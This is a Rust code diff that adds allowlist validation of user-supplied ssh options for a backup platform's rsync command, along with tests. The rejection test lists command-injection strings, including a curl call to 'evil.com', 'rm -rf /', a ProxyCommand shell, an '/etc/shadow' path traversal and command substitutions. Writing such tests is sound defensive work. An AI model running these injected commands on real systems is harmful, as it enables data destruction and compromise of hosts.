@@ -63,6 +63,96 @@ struct RestorePlan {
     env: Vec<String>,
 }
 
+fn is_safe_ssh_token_str(val: &str) -> bool {
+    !val.is_empty()
+        && !val.contains("..")
+        && val
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '_' | '-'))
+}
+
+fn validate_ssh_o_option(opt: &str) -> anyhow::Result<()> {
+    let Some((key, val)) = opt.split_once('=') else {
+        bail!("invalid -o option format: expected key=value");
+    };
+    match key.to_ascii_lowercase().as_str() {
+        "stricthostkeychecking"
+        | "userknownhostsfile"
+        | "connecttimeout"
+        | "batchmode"
+        | "compression"
+        | "serveraliveinterval"
+        | "serveralivecountmax"
+        | "port"
+        | "identityfile" => {}
+        _ => bail!("disallowed ssh -o option: {key}"),
+    }
+    if !is_safe_ssh_token_str(val) {
+        bail!("unsafe value for ssh -o option: {key}");
+    }
+    Ok(())
+}
+
+fn validate_ssh_token(arg: &str, next: Option<&str>) -> anyhow::Result<usize> {
+    match arg {
+        "-4" | "-6" | "-q" | "-v" => Ok(1),
+        "-p" => {
+            let port = next.ok_or_else(|| anyhow::anyhow!("missing port for -p"))?;
+            let num: u16 = port.parse().map_err(|_| anyhow::anyhow!("invalid port"))?;
+            if num == 0 {
+                bail!("port cannot be 0");
+            }
+            Ok(2)
+        }
+        "-i" | "-F" => {
+            let path = next.ok_or_else(|| anyhow::anyhow!("missing path for {arg}"))?;
+            if !is_safe_ssh_token_str(path) {
+                bail!("unsafe path for {arg}");
+            }
+            Ok(2)
+        }
+        "-o" => {
+            let opt = next.ok_or_else(|| anyhow::anyhow!("missing argument for -o"))?;
+            validate_ssh_o_option(opt)?;
+            Ok(2)
+        }
+        _ => bail!("disallowed ssh option: {arg}"),
+    }
+}
+
+pub(crate) fn validate_rsync_ssh_options(options: &str) -> anyhow::Result<()> {
+    let trimmed = options.trim();
+    if trimmed.is_empty() {
+        return Ok(());
+    }
+    const FORBIDDEN: &[char] = &[
+        ';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r', '\\', '"', '\'',
+    ];
+    if trimmed.contains(FORBIDDEN) {
+        bail!("rsync ssh_options contains forbidden characters");
+    }
+    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
+    let mut idx = 0;
+    if tokens.first().copied() == Some("ssh") {
+        idx = 1;
+    }
+    while idx < tokens.len() {
+        let arg = tokens[idx];
+        idx += validate_ssh_token(arg, tokens.get(idx + 1).copied())?;
+    }
+    Ok(())
+}
+
+fn format_rsync_rsh(ssh_options: &str) -> anyhow::Result<String> {
+    validate_rsync_ssh_options(ssh_options)?;
+    let trimmed = ssh_options.trim();
+    if trimmed.starts_with("ssh") {
+        Ok(trimmed.to_string())
+    } else {
+        Ok(format!("ssh {trimmed}"))
+    }
+}
+
 impl Platform {
     /// The backup settings stored in the platform database, or the defaults.
     pub async fn backup_config(&self) -> anyhow::Result<BackupConfig> {
@@ -76,6 +166,9 @@ impl Platform {
     /// empty ones keep them, and removing a target clears its secret. The settings are stored
     /// without secrets; they live sealed in their own rows.
     pub async fn set_backup_config(&self, mut config: BackupConfig) -> anyhow::Result<()> {
+        if let Some(ref rsync) = config.rsync {
+            validate_rsync_ssh_options(&rsync.ssh_options)?;
+        }
         self.save_s3_secret(&mut config.s3).await?;
         self.save_sftp_secret(&mut config.sftp).await?;
         self.save_rsync_secret(&mut config.rsync).await?;
@@ -1136,7 +1229,7 @@ impl Platform {
         let mut cmd = tokio::process::Command::new("rsync");
         cmd.arg("-avz");
         if !rsync.ssh_options.is_empty() {
-            cmd.arg("-e").arg(&rsync.ssh_options);
+            cmd.arg("-e").arg(format_rsync_rsh(&rsync.ssh_options)?);
         }
         if !secret.is_empty() {
             cmd.env("RSYNC_PASSWORD", &secret);
@@ -2929,5 +3022,46 @@ mod tests {
         assert_eq!(drill.table_count, 1);
         assert!(drill.has_data);
         assert_eq!(uncompressed_size, postgres_dump.len() as u64);
+    }
+
+    #[test]
+    fn test_validate_rsync_ssh_options_valid() {
+        let valid = [
+            "",
+            "   ",
+            "ssh -p 2222",
+            "-p 22",
+            "ssh -p 2222 -i /root/.ssh/id_rsa",
+            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10",
+            "ssh -o BatchMode=yes",
+            "-4 -p 2222 -q",
+        ];
+        for opt in valid {
+            assert!(validate_rsync_ssh_options(opt).is_ok(), "should be valid: {opt}");
+        }
+        assert_eq!(format_rsync_rsh("-p 2222").unwrap(), "ssh -p 2222");
+        assert_eq!(format_rsync_rsh("ssh -p 2222").unwrap(), "ssh -p 2222");
+    }
+
+    #[test]
+    fn test_validate_rsync_ssh_options_rejects_injections() {
+        let invalid = [
+            "bash -c 'id'",
+            "sh -c 'curl evil.com'",
+            "ssh -o ProxyCommand='bash -c id'",
+            "ssh -o LocalCommand=id",
+            "ssh -p 2222; rm -rf /",
+            "ssh -p 2222 | cat",
+            "ssh -p 2222 && whoami",
+            "ssh -p 999999",
+            "ssh -p 0",
+            "ssh -i ../../../etc/shadow",
+            "ssh -o DisallowedOption=123",
+            "ssh `whoami`",
+            "ssh $(whoami)",
+        ];
+        for opt in invalid {
+            assert!(validate_rsync_ssh_options(opt).is_err(), "should be rejected: {opt}");
+        }
     }
 }
